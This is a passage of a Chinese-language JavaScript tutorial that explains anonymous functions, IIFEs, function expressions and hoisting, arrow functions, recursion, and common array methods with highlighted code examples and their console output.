<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">number</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(number);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们给 <code>.forEach</code> 方法传递了一个匿名函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span>(<span class="params">number</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(number);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>作为参数，这个匿名函数接收数组中的每个元素作为参数，并将其打印到控制台。</p>
<h4 id="立即执行函数表达式（IIFE）"><a href="#立即执行函数表达式（IIFE）" class="headerlink" title="立即执行函数表达式（IIFE）"></a>立即执行函数表达式（IIFE）</h4><p>匿名函数还可以被用作 IIFE，这是一种 JavaScript 模式，用于立即执行一次函数并创建一个新的作用域，有助于避免变量污染全局作用域。例如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    (<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> message = <span class="string">&quot;Hello, world!&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(message);</span></span><br><span class="line"><span class="language-javascript">    &#125;)();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个匿名函数被定义并立即执行了，<code>message</code> 变量在这个匿名函数内是局部的，不会影响到全局作用域。</p>
<h3 id="表达式形式函数"><a href="#表达式形式函数" class="headerlink" title="表达式形式函数"></a>表达式形式函数</h3><p>概述：在 JS 当中函数有两种形式：</p>
<ol>
<li>关键字 function 定义的函数。</li>
<li>表达式形式函数，就是讲关键字 function 定义的函数赋值给变量形式</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> jch = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; J S &quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">jch</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>将关键字 function 定义函数赋值给变量，这种形式的函数称之为表达式形式函数</li>
</ul>
<h3 id="关键字形式函数与表达式形式函数区别"><a href="#关键字形式函数与表达式形式函数区别" class="headerlink" title="关键字形式函数与表达式形式函数区别"></a>关键字形式函数与表达式形式函数区别</h3><p>概述：两者功能是一样的，都属于函数；都是可以将某一个功能进行封装，当你想用这个功能的时候，调用</p>
<p>即可。</p>
<p>但是，他们两者在使用的时候语法有一些注意事项</p>
<ul>
<li>表达式形式函数：只能在声明之后才可以调用。如果在之前调用会提示不是一个函数</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fun</span>(); </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 报错并终止运行</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> fun = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> a = <span class="number">666</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>*a);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fun</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>关键字形式函数可以在声明之前、声明之后调用。</li>
<li>由于解析器，可以将关键字形式函数声明部分提升到当前作用域最上方。</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fun</span>(<span class="number">666</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params">num</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>*num);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 1332</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h3><p>当您需要简洁地定义一个函数时，JavaScript 的箭头函数就是一个非常有用的工具。以下是箭头函数的一些特点和使用方法：</p>
<h4 id="简洁的语法："><a href="#简洁的语法：" class="headerlink" title="简洁的语法："></a>简洁的语法：</h4><p>箭头函数提供了一种更简洁的语法，可以更轻松地定义匿名函数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 传统函数声明</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 箭头函数</span></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">add</span> = (<span class="params">a, b</span>) =&gt; a + b;</span><br></pre></td></tr></table></figure>

<h4 id="隐式返回："><a href="#隐式返回：" class="headerlink" title="隐式返回："></a>隐式返回：</h4><p>如果箭头函数的函数体只有一行代码，它会隐式返回这行代码的结果，无需使用 <code>return</code> 关键字。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">double</span> = (<span class="params">num</span>) =&gt; num * <span class="number">2</span>; <span class="comment">// 隐式返回</span></span><br></pre></td></tr></table></figure>

<h4 id="适用于回调函数："><a href="#适用于回调函数：" class="headerlink" title="适用于回调函数："></a>适用于回调函数：</h4><p>在回调函数中，箭头函数的简洁语法使得代码更易读。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 传统的回调函数</span></span><br><span class="line">array.<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">element</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> element * <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用箭头函数简化</span></span><br><span class="line">array.<span class="title function_">map</span>(<span class="function"><span class="params">element</span> =&gt;</span> element * <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<h4 id="没有自己的-this："><a href="#没有自己的-this：" class="headerlink" title="没有自己的 this："></a>没有自己的 <code>this</code>：</h4><p> 箭头函数没有自己的 <code>this</code> 上下文，它会继承外部作用域的 <code>this</code> 值。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">    <span class="attr">value</span>: <span class="number">42</span>,</span><br><span class="line">    <span class="attr">getValue</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传统函数声明中的 this</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">getValue</span>()); </span><br><span class="line"><span class="comment">// 输出 42</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 箭头函数中的 this 继承自外部作用域的 this</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">    <span class="attr">value</span>: <span class="number">42</span>,</span><br><span class="line">    <span class="attr">getValue</span>: <span class="function">() =&gt;</span> <span class="variable language_">this</span>.<span class="property">value</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">getValue</span>()); </span><br><span class="line"><span class="comment">// 输出 undefined，因为箭头函数中的 this 绑定到全局对象</span></span><br></pre></td></tr></table></figure>

<h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><p>概述：在很多语言当中，都有函数直接或者间接调用自身这种现象。像这种现象称之为递归现象。</p>
<p>以下是无限递归的实例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; 你好 &quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">test</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">test</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="IIFE"><a href="#IIFE" class="headerlink" title="IIFE"></a>IIFE</h3><p>在匿名函数的时候提过一嘴…</p>
<p>概述：IIFE，<strong>表达式形式函数</strong>后面可以紧随小括号立即执行一次。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; 你好 &quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">test</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注：会有报错</p>
<h4 id="其他写法"><a href="#其他写法" class="headerlink" title="其他写法"></a>其他写法</h4><p>概述：<strong>关键字形式函数</strong>后面不能紧随小括号立即执行。但是程序员可以通过一些手段，将关键字形式函数变为表达式形式函数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">+<span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; + &quot;</span>);</span><br><span class="line">	<span class="title function_">test</span>();</span><br><span class="line">&#125;();</span><br><span class="line"></span><br><span class="line">-<span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; - &quot;</span>);</span><br><span class="line">	<span class="title function_">test</span>();</span><br><span class="line">&#125;();</span><br><span class="line"></span><br><span class="line">!<span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; ! &quot;</span>);</span><br><span class="line">	<span class="title function_">test</span>();</span><br><span class="line">&#125;();</span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; () &quot;</span>);</span><br><span class="line">	<span class="title function_">test</span>();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<ul>
<li>加、减、非、小括号：可以将关键字形式函数变为表达式形式的函数</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">+<span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">name</span>)&#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line">	<span class="title function_">test</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">&#125;();</span><br><span class="line"></span><br><span class="line">-<span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">name</span>)&#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line">	<span class="title function_">test</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure>

<ul>
<li>每一个 IIFE 都有属于自己独立作用域，且相互不影响的。</li>
</ul>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="数组-1"><a href="#数组-1" class="headerlink" title="数组"></a>数组</h3><p>概述：在很多的编程语言当中都有数组存在。数组你可以理解为是一个大容器，这个容器可以存储很多的任意类型数值。存储的数据都是有序的数据。在 JS 这门语言当中数组利用中括号进行表示。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> []); <span class="comment">// object</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="number">1</span>,<span class="literal">true</span>,<span class="title class_">NaN</span>,<span class="string">&quot;快乐&quot;</span>,<span class="literal">null</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;]);</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="string">&quot;你好&quot;</span>,<span class="string">&quot;我好&quot;</span>,<span class="string">&quot;大家好&quot;</span>,<span class="number">1</span>,<span class="title class_">NaN</span>,<span class="literal">false</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">[]</span><br><span class="line">object</span><br><span class="line">[ <span class="number">1</span>, <span class="literal">true</span>, <span class="title class_">NaN</span>, <span class="string">&#x27;快乐&#x27;</span>, <span class="literal">null</span>, [<span class="title class_">Function</span> (anonymous)] ]</span><br><span class="line">[ <span class="string">&#x27;你好&#x27;</span>, <span class="string">&#x27;我好&#x27;</span>, <span class="string">&#x27;大家好&#x27;</span>, <span class="number">1</span>, <span class="title class_">NaN</span>, <span class="literal">false</span> ]</span><br></pre></td></tr></table></figure>

<ul>
<li><p>在 JS 当中用中括号代表数组</p>
</li>
<li><p>数组在 JS 当中属于引用类型数据</p>
</li>
<li><p>数组可以存储很多任意类型数据</p>
</li>
<li><p>数组里面存储的数据我们经常叫做“元素”，多个元素之间利用逗号隔开。</p>
</li>
<li><p>数组在使用的时候为了方便，可以将数组赋值给变量进行存储，通过访问变量名字就可以操作数组</p>
</li>
</ul>
<h4 id="基本使用-1"><a href="#基本使用-1" class="headerlink" title="基本使用"></a>基本使用</h4><p>概述：在 JS 当中数组（引用类型数据）可以存储很多任意类型数据且有序存储。当然也可以读取、修改、添加数据。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">&quot;你好&quot;</span>,<span class="string">&quot;我好&quot;</span>,<span class="string">&quot;大家好&quot;</span>,<span class="number">1</span>,<span class="title class_">NaN</span>,<span class="literal">false</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">66</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">3</span>]);</span><br><span class="line">arr[<span class="number">3</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>数组里面元素可以通过枚举法获取到。</p>
</li>
<li><p>枚举法：数组后面紧随一个中括号，中括号里面放置的是获取元素对应的索引值或下角标。</p>
</li>
<li><p>元素的索引值是从数字 0 开始的。</p>
</li>
<li><p><strong>数组枚举元素的时候，下角标越界程序不会报错，默认返回的是 undefined</strong></p>
</li>
</ul>
<h3 id="常用属性与方法"><a href="#常用属性与方法" class="headerlink" title="常用属性与方法"></a>常用属性与方法</h3><h4 id="length-属性"><a href="#length-属性" class="headerlink" title="length 属性"></a>length 属性</h4><p>概述：数组拥有 length 属性，它主要的作用是可以获取到数组元素个数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=[<span class="string">&quot;学习&quot;</span>,<span class="string">&quot;工作&quot;</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;=arr.<span class="property">length</span>;i++)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">学习</span><br><span class="line">工作</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line">[ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> ]</span><br><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></table></figure>

<ul>
<li>数组里面元素可以是任意类型数值，也就会出现数组嵌套数组情况（二维数组）</li>
</ul>
<h4 id="push-和-pop"><a href="#push-和-pop" class="headerlink" title="push 和 pop"></a>push 和 pop</h4><p>主要的作用分别是：</p>
<p>push：可以在<strong>数组尾部</strong>添加一个或者多个元素</p>
<p>pop：可以在<strong>数组尾部</strong>移除一个元素（ pop 一次只能移除一个元素）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">arr.<span class="title function_">pop</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr);</span><br><span class="line"></span><br><span class="line">arr.<span class="title function_">push</span>(<span class="number">6</span>,<span class="number">7</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">[ <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ]</span><br><span class="line">[</span><br><span class="line">  <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>,</span><br><span class="line">  <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h4 id="unshift-和-shift"><a href="#unshift-和-shift" class="headerlink" title="unshift 和 shift"></a>unshift 和 shift</h4><p>主要的作用分别是：</p>
<p>unshift：可以在数组<strong>头部</strong>添加一个或者是多个元素</p>
<p>shift：可以在数组<strong>头部</strong>移除一个元素（一次只能移除一个元素）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">arr.<span class="title function_">shift</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr);</span><br><span class="line"></span><br><span class="line">arr.<span class="title function_">unshift</span>(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">[ <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span> ]</span><br><span class="line">[</span><br><span class="line">  <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>,</span><br><span class="line">  <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h4 id="join-和-reverse"><a href="#join-和-reverse" class="headerlink" title="join 和 reverse"></a>join 和 reverse</h4><p>主要的作用分别是：</p>
<p>join：主要的作用是可以通过某一个字符将数组拼接转换为字符串。对起始数组没有任何影响。</p>
<p>reverse：可以把当前的数组的元素进行倒置。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr1=arr.<span class="title function_">join</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr1);</span><br><span class="line"><span class="keyword">var</span> arr2=arr.<span class="title function_">join</span>(<span class="string">&quot;+&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr3=arr.<span class="title function_">reverse</span>(arr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr3);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="number">1</span>*<span class="number">2</span>*<span class="number">3</span>*<span class="number">4</span>*<span class="number">5</span>*<span class="number">6</span></span><br><span class="line"><span class="number">1</span>+<span class="number">2</span>+<span class="number">3</span>+<span class="number">4</span>+<span class="number">5</span>+<span class="number">6</span></span><br><span class="line">[ <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span> ]</span><br></pre></td></tr></table></figure>

<h4 id="indexOf-和-includes"><a href="#indexOf-和-includes" class="headerlink" title="indexOf 和 includes"></a>indexOf 和 includes</h4><p>主要的作用分别是：</p>
<p>indexOf：它可以获取数组当中某一个元素的索引值（下脚标）。</p>
<p>includes：它主要的作用是检测某一个元素是不是当前这个数组的。如果是则返回布尔值真，否则返回布尔值假。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr.<span class="title function_">indexOf</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr.<span class="title function_">includes</span>(<span class="number">1</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr.<span class="title function_">includes</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h4 id="slice-和-splice"><a href="#slice-和-splice" class="headerlink" title="slice 和 splice"></a>slice 和 splice</h4><p>主要的作用分别是：</p>
<p>slice：从起始数组当中切割出一个新的子数组。</p>
<p>splice：可以对数组进行切割、插入、替换。</p>
<p>两者的输出值为原数组中被切除的元素组成的新数组。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=[<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;deca&quot;</span>,<span class="string">&quot;and&quot;</span>,<span class="string">&quot;queen&quot;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> newarr1=arr.<span class="title function_">slice</span>(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> newarr2=arr.<span class="title function_">slice</span>(<span class="number">2</span>,<span class="number">5</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(newarr1);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(newarr2);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 切割</span></span><br><span class="line"><span class="keyword">var</span> arr2=arr.<span class="title function_">splice</span>(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">var</span> arr3=arr.<span class="title function_">splice</span>(<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr2);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr3);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">[ <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;queen&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> ]</span><br><span class="line">[ <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;queen&#x27;</span>, <span class="number">1</span> ]</span><br><span class="line">[ <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;deca&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;queen&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> ]</span><br><span class="line">[ <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> ]</span><br><span class="line">[ <span class="string">&#x27;deca&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;queen&#x27;</span>, <span class="number">1</span> ]</span><br><span class="line">[ <span class="string">&#x27;hello&#x27;</span> ]</span><br></pre></td></tr></table></figure>

<ul>
<li><p>slice：传递至少一个、至多两个参数（起始索引值、结束索引值）。对于起始数组没有任何影响。</p>
</li>
<li><p>splice：第一个参数：切割的起始位置索引值，第二个参数：切割元素的长度。对于起始数组是<strong>有</strong>影响的。</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr=[<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;deca&quot;</span>,<span class="string">&quot;and&quot;</span>,<span class="string">&quot;queen&quot;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//替换:代表从起始数组索引值2切割出两个元素，使用mama,haha进行替换。</span></span><br><span class="line"><span class="keyword">var</span> arr1=arr.<span class="title function_">splice</span>(<span class="number">2</span>,<span class="number">2</span>,<span class="string">&quot;mama&quot;</span>,<span class="string">&quot;haha&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr1);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入：代表从索引值为2的地方切割出零个元素，插入进一个元素lili</span></span><br><span class="line"><span class="keyword">var</span> arr2=arr.<span class="title function_">splice</span>(<span class="number">2</span>,<span class="number">0</span>,<span class="string">&quot;lili&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr2);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">[ <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;queen&#x27;</span> ]</span><br><span class="line">[ <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;deca&#x27;</span>, <span class="string">&#x27;mama&#x27;</span>, <span class="string">&#x27;haha&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> ]</span><br><span class="line">[]</span><br><span class="line">[</span><br><span class="line">  <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;deca&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;lili&#x27;</span>,  <span class="string">&#x27;mama&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;haha&#x27;</span>,  <span class="number">1</span>,</span><br><span class="line">  <span class="number">2</span>,       <span class="number">3</span>,</span><br><span class="line">  <span class="number">4</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="数据类型相等判断"><a href="#数据类型相等判断" class="headerlink" title="数据类型相等判断"></a>数据类型相等判断</h3><p>基本类型数据：数字、字符串、布尔、未定义类型、空对象</p>
<p>引用类型数据（Object）：函数、数组</p>
<p>注意：我们在书写代码的时候，代码存储计算机内存当中。计算机内存中分：五大区域。</p>
